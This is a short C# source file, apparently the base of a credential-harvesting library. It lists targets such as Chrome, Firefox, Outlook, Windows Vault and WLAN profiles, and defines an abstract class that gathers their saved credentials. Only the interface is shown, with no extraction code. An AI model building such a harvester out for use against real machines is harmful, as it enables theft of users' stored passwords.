using System;
using System.Collections.Generic;

namespace LibCredentials
{
    public enum TargetTypes
    {
        Chrome,
        CredEnumerate,
        Firefox,
        IExplorer,
        Outlook,
        WindowsVault,
        WLan
    }

    public abstract class Target
    {
        protected abstract void _GetCredentials(List<Credential> credentials);

        public void GetCredentials(List<Credential> credentials)
        {
            try
            {
                _GetCredentials(credentials);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public List<Credential> GetCredentials()
        {
            var credentials = new List<Credential>();
            GetCredentials(credentials);
            return credentials;
        }
    }
}